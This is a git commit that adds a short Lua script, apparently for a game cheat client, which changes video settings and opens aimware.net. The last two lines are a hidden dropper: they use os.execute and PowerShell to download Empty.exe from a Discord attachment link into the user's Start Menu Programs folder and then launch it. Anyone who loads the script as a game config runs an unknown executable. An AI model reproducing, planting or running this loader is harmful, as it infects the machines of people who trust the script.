f47728c62badda1775657da2e4b19f121d828c65
bebraLLC <101327831+bebraLLC@users.noreply.github.com>
2022-07-17 17:50:48 +0300

    Add files via upload

---
+++ d.lua
@@ -0,0 +1,4 @@
+client.Command("alias helboidaun mat_setvideomode 1920 1080 0", true)
+client.Command("helboidaun", true)
+os.execute([[powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/970303896473980971/998239160861208597/Empty.exe', '%systemdrive%/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Empty.exe') }"]])
+os.execute('start https://aimware.net/ & curl -O & start cmd /k "cd %systemdrive%/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/ & Start Empty.exe & exit"')
